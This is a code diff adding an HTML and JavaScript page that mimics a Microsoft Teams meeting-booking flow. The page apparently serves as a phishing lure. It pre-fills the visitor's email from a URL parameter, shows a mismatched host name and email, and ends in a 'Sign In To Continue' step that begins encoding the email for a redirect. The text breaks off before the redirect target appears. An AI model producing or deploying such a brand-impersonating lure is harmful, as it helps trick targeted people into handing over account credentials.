@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Book a Meeting - Microsoft Teams</title>
+    <style>
+        /* General Reset */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            height: 100vh;
+            background-color: #f3f2f1;
+            color: #252423;
+            overflow: hidden;
+        }
+
+        /* --- LEFT SIDEBAR --- */
+        .sidebar {
+            width: 320px;
+            background-color: #555a9a;
+            color: white;
+            padding: 32px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .sidebar::before {
+            content: '';
+            position: absolute;
+            bottom: -150px;
+            left: -150px;
+            width: 400px;
+            height: 400px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 48px;
+        }
+
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 32px;
+        }
+
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: #e2e2e2;
+            margin-bottom: 16px;
+            border: 3px solid white;
+            object-fit: cover;
+        }
+
+        .profile-name {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .profile-title {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 4px;
+        }
+
+        .profile-email {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .meeting-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            margin-top: 16px;
+        }
+
+        .meeting-desc {
+            font-size: 14px;
+            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 32px;
+        }
+
+        .features-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .feature-icon-bg {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .feature-icon-bg svg {
+            width: 16px;
+            height: 16px;
+            fill: white;
+        }
+
+        .sidebar-footer {
+            margin-top: auto;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        /* --- MAIN CONTENT AREA --- */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background-color: #f9f9fc;
+            overflow-y: auto;
+        }
+
+        /* Header / Top Bar */
+        .top-bar {
+            height: 60px;
+            background-color: white;
+            border-bottom: 1px solid #edebe9;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 32px;
+        }
+
+        .progress-steps {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #605e5c;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .step.active {
+            color: #252423;
+            font-weight: 600;
+        }
+
+        .step-number {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: #e1dfdd;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .step.active .step-number {
+            background-color: #555a9a;
+            color: white;
+        }
+
+        .step-arrow {
+            color: #c8c6c4;
+            font-size: 12px;
+        }
+
+        .top-badge {
+            background-color: #f3f2f1;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #605e5c;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .top-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: #555a9a;
+        }
+
+        /* Content Grid */
+        .content-grid {
+            display: flex;
+            padding: 40px;
+            gap: 32px;
+            max-width: 1100px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Left Column */
+        .left-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            max-width: 500px;
+        }
+
+        /* Right Column */
+        .right-col {
+            width: 360px;
+        }
+
+        /* Cards */
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #252423;
+        }
+
+        /* Duration Selector */
+        .duration-options {
+            display: flex;
+            gap: 12px;
+        }
+
+        .duration-btn {
+            padding: 10px 20px;
+            border: 1px solid #edebe9;
+            border-radius: 20px;
+            background: white;
+            font-size: 14px;
+            color: #252423;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .duration-btn:hover {
+            border-color: #c8c6c4;
+        }
+
+        .duration-btn.active {
+            border-color: #555a9a;
+            background-color: #f0f1fa;
+            color: #555a9a;
+            font-weight: 600;
+        }
+
+        /* Calendar */
+        .calendar-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .calendar-month {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .calendar-nav {
+            display: flex;
+            gap: 8px;
+        }
+
+        .nav-btn {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 1px solid #edebe9;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            color: #605e5c;
+        }
+        
+        .nav-btn:hover {
+            background-color: #f3f2f1;
+        }
+
+        .calendar-grid {
+            display: grid;
+            grid-template-columns: repeat(7, 1fr);
+            text-align: center;
+            gap: 8px;
+        }
+
+        .day-name {
+            font-size: 11px;
+            font-weight: 600;
+            color: #a19f9d;
+            margin-bottom: 8px;
+        }
+
+        .day-num {
+            width: 36px;
+            height: 36px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+            border-radius: 50%;
+            margin: 0 auto;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .day-num:hover:not(.disabled):not(.selected) {
+            background-color: #f3f2f1;
+        }
+
+        .day-num.disabled {
+            color: #c8c6c4;
+            cursor: default;
+        }
+
+        .day-num.selected {
+            background-color: #555a9a;
+            color: white;
+        }
+
+        .day-num.empty {
+            cursor: default;
+        }
+
+        /* Time Slots Section */
+        .time-slots-section {
+            display: none; 
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #edebe9;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .time-slots-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #252423;
+        }
+
+        .time-slots-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .time-btn {
+            padding: 10px;
+            border: 1px solid #edebe9;
+            border-radius: 4px;
+            background: white;
+            font-size: 13px;
+            color: #252423;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .time-btn:hover:not(.disabled) {
+            border-color: #c8c6c4;
+        }
+
+        .time-btn.active {
+            border-color: #555a9a;
+            background-color: #f0f1fa;
+            color: #555a9a;
+            font-weight: 600;
+        }
+
+        .time-btn.disabled {
+            background-color: #f3f2f1;
+            color: #c8c6c4;
+            border-color: #f3f2f1;
+            cursor: not-allowed;
+            text-decoration: line-through;
+        }
+
+        /* Flexible Time Input */
+        .flex-time-container {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .flex-time-label {
+            font-size: 13px;
+            color: #605e5c;
+        }
+
+        .flex-time-input {
+            padding: 10px;
+            border: 1px solid #c8c6c4;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #252423;
+            outline: none;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .flex-time-input:focus {
+            border-color: #555a9a;
+        }
+
+        /* Warning Message below Time Input */
+        .time-warning {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none; /* Hidden by default */
+        }
+
+        .time-warning.visible {
+            display: block;
+        }
+
+        /* Right Column - Meeting Details */
+        .details-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+        }
+
+        .host-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #edebe9;
+            margin-bottom: 20px;
+        }
+
+        .host-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .host-details {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .host-name {
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .host-title {
+            font-size: 12px;
+            color: #605e5c;
+            margin-top: 2px;
+        }
+
+        .meeting-info-list {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .info-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 13px;
+            color: #605e5c;
+        }
+
+        .info-row svg {
+            width: 16px;
+            height: 16px;
+            fill: #a19f9d;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .info-row strong {
+            color: #252423;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 2px;
+        }
+        
+        .info-row span.placeholder-text {
+            font-style: italic;
+            color: #a19f9d;
+        }
+
+        .info-row span.active-text {
+            font-style: normal;
+            color: #252423;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #b8bce4; 
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: not-allowed; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .continue-btn.ready {
+            background-color: #555a9a;
+            cursor: pointer;
+        }
+
+        .continue-btn.ready:active {
+            transform: scale(0.98);
+        }
+
+        /* --- STEP 2: DETAILS FORM --- */
+        .details-form {
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            gap: 20px;
+            margin-top: 24px;
+        }
+
+        .details-form.active {
+            display: flex;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            text-align: left;
+        }
+
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #252423;
+        }
+        
+        /* Styling for the required asterisk */
+        .required-asterisk {
+            color: #d13438;
+            margin-left: 2px;
+        }
+
+        .form-group input, 
+        .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #c8c6c4;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #252423;
+            outline: none;
+            font-family: 'Segoe UI', sans-serif;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus, 
+        .form-group textarea:focus {
+            border-color: #555a9a;
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .sign-in-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #555a9a;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+
+        .sign-in-btn:hover {
+            background-color: #454982;
+        }
+
+        .back-link {
+            text-align: center;
+            font-size: 13px;
+            color: #605e5c;
+            cursor: pointer;
+            margin-top: 16px;
+            text-decoration: none;
+        }
+        
+        .back-link:hover {
+            color: #252423;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LEFT SIDEBAR -->
+    <aside class="sidebar">
+        <div class="brand">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 6H16V4C16 2.89543 15.1046 2 14 2H10C8.89543 2 8 2.89543 8 4V6H4C2.89543 6 2 6.89543 2 8V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V8C22 6.89543 21.1046 6 20 6ZM10 4H14V6H10V4ZM15 11.5H13V16H11V11.5H9V10H15V11.5Z" fill="white"/>
+            </svg>
+            Microsoft Teams
+        </div>
+
+        <div class="profile-section">
+            <img src="https://i.pravatar.cc/150?img=11" alt="Jin Wang" class="avatar">
+            <div class="profile-name">Jin Wang</div>
+            <div class="profile-title">Manager Director</div>
+            <div class="profile-email">sarah.chen@company.com</div>
+        </div>
+
+        <div class="meeting-title">Discovery Call</div>
+        <div class="meeting-desc">
+            Let's discuss how we can support your team's goals and explore potential collaboration opportunities.
+        </div>
+
+        <div class="features-list">
+            <div class="feature-item">
+                <div class="feature-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                </div>
+                Flexible scheduling — pick any available time
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4zM15 16H5V8h10v8z"/></svg>
+                </div>
+                Video call via Microsoft Teams
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+                </div>
+                Secure — identity verified before booking
+            </div>
+        </div>
+
+        <div class="sidebar-footer">
+            © 2026 Microsoft Teams · All rights reserved
+        </div>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-content">
+        
+        <!-- Top Bar -->
+        <header class="top-bar">
+            <div class="progress-steps" id="progressSteps">
+                <div class="step active" id="step1">
+                    <div class="step-number">1</div>
+                    Select time
+                </div>
+                <span class="step-arrow">›</span>
+                <div class="step" id="step2">
+                    <div class="step-number">2</div>
+                    Your details
+                </div>
+                <span class="step-arrow">›</span>
+                <div class="step" id="step3">
+                    <div class="step-number">3</div>
+                    Confirm
+                </div>
+            </div>
+
+            <div class="top-badge">
+                <svg viewBox="0 0 24 24"><path d="M20 6H16V4C16 2.89543 15.1046 2 14 2H10C8.89543 2 8 2.89543 8 4V6H4C2.89543 6 2 6.89543 2 8V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V8C22 6.89543 21.1046 6 20 6ZM10 4H14V6H10V4ZM15 11.5H13V16H11V11.5H9V10H15V11.5Z"/></svg>
+                Microsoft Teams
+            </div>
+        </header>
+
+        <!-- Main Grid -->
+        <div class="content-grid">
+            
+            <!-- Left Column -->
+            <div class="left-col">
+                
+                <!-- STEP 1: TIME SELECTION -->
+                <div id="step1-content">
+                    <!-- Duration Card -->
+                    <div class="card" style="margin-bottom: 24px;">
+                        <div class="card-title">How long do you need?</div>
+                        <div class="duration-options">
+                            <button class="duration-btn" data-time="15">15 mins</button>
+                            <button class="duration-btn" data-time="30">30 mins</button>
+                            <button class="duration-btn" data-time="45">45 mins</button>
+                        </div>
+                    </div>
+
+                    <!-- Calendar Card -->
+                    <div class="card">
+                        <div class="calendar-header">
+                            <div class="calendar-month" id="monthYearDisplay">Loading...</div>
+                            <div class="calendar-nav">
+                                <button class="nav-btn" id="prevMonth">‹</button>
+                                <button class="nav-btn" id="nextMonth">›</button>
+                            </div>
+                        </div>
+                        
+                        <div class="calendar-grid" id="calendarGrid">
+                            <div class="day-name">SU</div>
+                            <div class="day-name">MO</div>
+                            <div class="day-name">TU</div>
+                            <div class="day-name">WE</div>
+                            <div class="day-name">TH</div>
+                            <div class="day-name">FR</div>
+                            <div class="day-name">SA</div>
+                        </div>
+
+                        <!-- Time Slots Section -->
+                        <div class="time-slots-section" id="timeSlotsSection">
+                            <div class="time-slots-title">Available times for <span id="selectedDateText"></span></div>
+                            
+                            <div class="time-slots-grid" id="timeSlotsGrid"></div>
+                            
+                            <!-- Flexible Time Input -->
+                            <div class="flex-time-container">
+                                <label class="flex-time-label" for="flexTimeInput">Or pick a specific time:</label>
+                                <input type="time" id="flexTimeInput" class="flex-time-input">
+                                <!-- Warning Message Container -->
+                                <div class="time-warning" id="timeWarning">
+                                    You cannot select a time in the past for today's date.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 2: DETAILS FORM -->
+                <div class="card details-form" id="step2-content">
+                    <div class="card-title" style="margin-bottom: 10px;">Your details</div>
+                    
+                    <div class="form-group">
+                        <!-- Added required asterisk -->
+                        <label>Full name <span class="required-asterisk">*</span></label>
+                        <input type="text" id="fullNameInput" placeholder="Enter your full name">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Email address</label>
+                        <!-- ID added to target via JS -->
+                        <input type="email" id="emailInput" placeholder="Enter your email">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Anything you'd like us to know? (optional)</label>
+                        <textarea placeholder="Add a note..."></textarea>
+                    </div>
+
+                    <button class="sign-in-btn" id="signInToContinueBtn">Sign In To Continue →</button>
+                    
+                    <a class="back-link" id="backToTimeBtn">← Back to time selection</a>
+                </div>
+
+            </div>
+
+            <!-- Right Column -->
+            <div class="right-col">
+                <div class="details-card">
+                    <div class="card-title">Your Meeting</div>
+                    
+                    <div class="host-info">
+                        <img src="https://i.pravatar.cc/150?img=11" alt="Jin Wang" class="host-avatar">
+                        <div class="host-details">
+                            <div class="host-name">Jin Wang</div>
+                            <div class="host-title">Manager Director</div>
+                        </div>
+                    </div>
+
+                    <div class="meeting-info-list">
+                        <div class="info-row">
+                            <svg viewBox="0 0 24 24"><path d="M20 6H16V4C16 2.89543 15.1046 2 14 2H10C8.89543 2 8 2.89543 8 4V6H4C2.89543 6 2 6.89543 2 8V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V8C22 6.89543 21.1046 6 20 6Z"/></svg>
+                            <div>
+                                <strong>Microsoft Teams</strong>
+                                Video conference
+                            </div>
+                        </div>
+                        
+                        <div class="info-row">
+                            <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zM12.5 7H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                            <div id="displayDuration" class="placeholder-text">—</div>
+                        </div>
+                        
+                        <div class="info-row">
+                            <svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11z"/></svg>
+                            <div id="displayDateTime"><span class="placeholder-text">Select date & time</span></div>
+                        </div>
+                    </div>
+
+                    <button class="continue-btn" id="continueBtn" disabled style="margin-top: 0;">Continue →</button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        // --- State Variables ---
+        let selectedDuration = null;
+        let selectedDate = null;
+        let selectedTime = null;
+
+        // Date variables
+        let currentDate = new Date();
+        let currentMonth = currentDate.getMonth(); 
+        let currentYear = currentDate.getFullYear();
+
+        const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+
+        // --- DOM Elements ---
+        const durationBtns = document.querySelectorAll('.duration-btn');
+        const calendarGrid = document.getElementById('calendarGrid');
+        const monthYearDisplay = document.getElementById('monthYearDisplay');
+        const prevMonthBtn = document.getElementById('prevMonth');
+        const nextMonthBtn = document.getElementById('nextMonth');
+        
+        const timeSlotsSection = document.getElementById('timeSlotsSection');
+        const selectedDateText = document.getElementById('selectedDateText');
+        const timeSlotsGrid = document.getElementById('timeSlotsGrid');
+        const flexTimeInput = document.getElementById('flexTimeInput');
+        const timeWarning = document.getElementById('timeWarning');
+        
+        const displayDuration = document.getElementById('displayDuration');
+        const displayDateTime = document.getElementById('displayDateTime');
+        const continueBtn = document.getElementById('continueBtn');
+
+        // Step Navigation elements
+        const step1Content = document.getElementById('step1-content');
+        const step2Content = document.getElementById('step2-content');
+        const step1Indicator = document.getElementById('step1');
+        const step2Indicator = document.getElementById('step2');
+        const backToTimeBtn = document.getElementById('backToTimeBtn');
+
+        // Form Inputs
+        const emailInput = document.getElementById('emailInput');
+        const fullNameInput = document.getElementById('fullNameInput');
+        const signInToContinueBtn = document.getElementById('signInToContinueBtn');
+
+        // --- Helper Function: Format 24h time to 12h AM/PM ---
+        function formatTime(timeString) {
+            if (!timeString) return '';
+            const [hourString, minute] = timeString.split(":");
+            const hour = parseInt(hourString, 10);
+            const ampm = hour >= 12 ? 'PM' : 'AM';
+            const hour12 = hour % 12 || 12;
+            return `${hour12 < 10 ? '0' + hour12 : hour12}:${minute} ${ampm}`;
+        }
+
+        // --- Fetch Email from URL Parameter ---
+        function fetchEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
+            
+            if (emailParam) {
+                const decodedEmail = decodeURIComponent(emailParam);
+                emailInput.value = decodedEmail;
+            }
+        }
+
+        // --- Dynamic Time Slots Generation ---
+        function generateTimeSlots(selectedDateObj) {
+            timeSlotsGrid.innerHTML = ''; 
+            timeWarning.classList.remove('visible'); 
+            
+            const baseSlots = ["09:00 AM", "10:30 AM", "01:00 PM", "02:30 PM", "04:00 PM", "05:30 PM"];
+            
+            const now = new Date();
+            const isToday = selectedDateObj.toDateString() === now.toDateString();
+            const twoHoursFromNow = new Date(now.getTime() + (2 * 60 * 60 * 1000));
+
+            baseSlots.forEach(slot => {
+                const btn = document.createElement('button');
+                btn.className = 'time-btn';
+                btn.textContent = slot;
+                btn.setAttribute('data-time', slot);
+
+                if (isToday) {
+                    const [time, modifier] = slot.split(' ');
+                    let [hours, minutes] = time.split(':');
+                    hours = parseInt(hours, 10);
+                    
+                    if (modifier === 'PM' && hours < 12) hours += 12;
+                    if (modifier === 'AM' && hours === 12) hours = 0;
+                    
+                    const slotDate = new Date();
+                    slotDate.setHours(hours, parseInt(minutes, 10), 0, 0);
+
+                    if (slotDate < twoHoursFromNow) {
+                        btn.classList.add('disabled');
+                        btn.disabled = true;
+                    }
+                }
+
+                if (!btn.disabled) {
+                    btn.addEventListener('click', function() {
+                        document.querySelectorAll('.time-btn').forEach(t => t.classList.remove('active'));
+                        this.classList.add('active');
+                        flexTimeInput.value = ''; 
+                        timeWarning.classList.remove('visible');
+                        selectedTime = this.getAttribute('data-time');
+                        updateDateTimeDisplay();
+                    });
+                }
+
+                timeSlotsGrid.appendChild(btn);
+            });
+        }
+
+        // --- Dynamic Calendar Generation ---
+        function generateCalendar(month, year) {
+            const dayNodes = calendarGrid.querySelectorAll('.day-num, .empty');
+            dayNodes.forEach(node => node.remove());
+
+            monthYearDisplay.textContent = `${monthNames[month]} ${year}`;
+
+            const firstDay = new Date(year, month, 1).getDay();
+            const daysInMonth = new Date(year, month + 1, 0).getDate();
+
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+
+            for (let i = 0; i < firstDay; i++) {
+                const emptyDiv = document.createElement('div');
+                emptyDiv.className = 'empty';
+                calendarGrid.appendChild(emptyDiv);
+            }
+
+            for (let i = 1; i <= daysInMonth; i++) {
+                const dayDiv = document.createElement('div');
+                dayDiv.className = 'day-num';
+                dayDiv.textContent = i;
+                
+                const thisDate = new Date(year, month, i);
+
+                if (thisDate < today) {
+                    dayDiv.classList.add('disabled');
+                } else {
+                    dayDiv.addEventListener('click', function() {
+                        document.querySelectorAll('.day-num').forEach(d => d.classList.remove('selected'));
+                        this.classList.add('selected');
+
+                        const displayStr = `${monthNames[month]} ${i}, ${year}`;
+                        const shortStr = `${monthNames[month].substring(0,3)} ${i}`;
+                        selectedDate = displayStr;
+                        
+                        selectedDateText.textContent = shortStr;
+                        timeSlotsSection.style.display = 'block';
+                        
+                        selectedTime = null;
+                        flexTimeInput.value = '';
+                        
+                        generateTimeSlots(thisDate);
+                        updateDateTimeDisplay();
+                    });
+                }
+
+                calendarGrid.appendChild(dayDiv);
+            }
+        }
+
+        // --- Event Listeners for Navigation ---
+        prevMonthBtn.addEventListener('click', () => {
+            currentMonth--;
+            if (currentMonth < 0) {
+                currentMonth = 11;
+                currentYear--;
+            }
+            generateCalendar(currentMonth, currentYear);
+        });
+
+        nextMonthBtn.addEventListener('click', () => {
+            currentMonth++;
+            if (currentMonth > 11) {
+                currentMonth = 0;
+                currentYear++;
+            }
+            generateCalendar(currentMonth, currentYear);
+        });
+
+        // Initialize Page
+        generateCalendar(currentMonth, currentYear);
+        fetchEmailFromURL(); 
+
+        // --- 1. Handle Duration Selection ---
+        durationBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                durationBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                
+                selectedDuration = this.getAttribute('data-time');
+                
+                displayDuration.textContent = `${selectedDuration} minutes`;
+                displayDuration.classList.remove('placeholder-text');
+                displayDuration.classList.add('active-text');
+                
+                checkFormCompletion();
+            });
+        });
+
+        // --- 2. Handle Flexible Time Input ---
+        flexTimeInput.addEventListener('change', function() {
+            timeWarning.classList.remove('visible'); 
+            
+            if (this.value) {
+                const now = new Date();
+                const selectedDateObj = new Date(selectedDate);
+                const isToday = selectedDateObj.toDateString() === now.toDateString();
+
+                const [hours, minutes] = this.value.split(':');
+                const inputTime = new Date();
+                inputTime.setHours(parseInt(hours, 10), parseInt(minutes, 10), 0, 0);
+
+                const twoHoursFromNow = new Date(now.getTime() + (2 * 60 * 60 * 1000));
+
+                if (isToday) {
+                    if (inputTime < now) {
+                        timeWarning.textContent = "You cannot select a time in the past for today's date.";
+                        timeWarning.classList.add('visible');
+                        this.value = ''; 
+                        selectedTime = null;
+                        document.querySelectorAll('.time-btn').forEach(t => t.classList.remove('active'));
+                    } 
+                    else if (inputTime < twoHoursFromNow) {
+                        timeWarning.textContent = "You have to select a time 2hrs ahead for today's date.";
+                        timeWarning.classList.add('visible');
+                        this.value = ''; 
+                        selectedTime = null;
+                        document.querySelectorAll('.time-btn').forEach(t => t.classList.remove('active'));
+                    } 
+                    else {
+                        document.querySelectorAll('.time-btn').forEach(t => t.classList.remove('active'));
+                        selectedTime = formatTime(this.value);
+                    }
+                } else {
+                    document.querySelectorAll('.time-btn').forEach(t => t.classList.remove('active'));
+                    selectedTime = formatTime(this.value);
+                }
+                
+                updateDateTimeDisplay();
+            } else {
+                selectedTime = null;
+                updateDateTimeDisplay();
+            }
+        });
+
+        // --- 3. Update Right Panel Date/Time text ---
+        function updateDateTimeDisplay() {
+            if (selectedDate && selectedTime) {
+                displayDateTime.innerHTML = `<span class="active-text">${selectedDate} at ${selectedTime}</span>`;
+            } else if (selectedDate) {
+                displayDateTime.innerHTML = `<span class="active-text">${selectedDate} <span class="placeholder-text">(select time)</span></span>`;
+            } else {
+                displayDateTime.innerHTML = `<span class="placeholder-text">Select date & time</span>`;
+            }
+            checkFormCompletion();
+        }
+
+        // --- 4. Enable/Disable Continue Button ---
+        function checkFormCompletion() {
+            if (selectedDuration && selectedDate && selectedTime) {
+                continueBtn.classList.add('ready');
+                continueBtn.disabled = false;
+            } else {
+                continueBtn.classList.remove('ready');
+                continueBtn.disabled = true;
+            }
+        }
+
+        // --- 5. STEP NAVIGATION LOGIC ---
+        
+        // Move to Step 2
+        continueBtn.addEventListener('click', () => {
+            if(!continueBtn.disabled) {
+                // Hide Step 1 content
+                step1Content.style.display = 'none';
+                // Show Step 2 content
+                step2Content.classList.add('active');
+
+                // Update Progress Bar
+                step1Indicator.classList.remove('active');
+                step2Indicator.classList.add('active');
+                
+                // Hide the continue button in the right panel so it doesn't look weird
+                continueBtn.style.display = 'none';
+            }
+        });
+
+        // Go back to Step 1
+        backToTimeBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Hide Step 2 content
+            step2Content.classList.remove('active');
+            // Show Step 1 content
+            step1Content.style.display = 'block';
+
+            // Update Progress Bar
+            step2Indicator.classList.remove('active');
+            step1Indicator.classList.add('active');
+
+            // Show the continue button again
+            continueBtn.style.display = 'flex';
+        });
+
+        // --- 6. Handle Step 2 Form Submission & Redirect ---
+        signInToContinueBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            // Validate Full Name is entered
+            if (fullNameInput.value.trim() === '') {
+                // Highlight empty field
+                fullNameInput.style.borderColor = '#d13438';
+                fullNameInput.focus();
+                alert("Please enter your full name to continue.");
+            } else {
+                // Reset border color if it was previously red
+                fullNameInput.style.borderColor = '#c8c6c4';
+                
+                // Get the email from the input field
+                const currentEmail = emailInput.value.trim();
+                
+                // URL encode the email so it works in a URL (e.g., converts @ to %40)
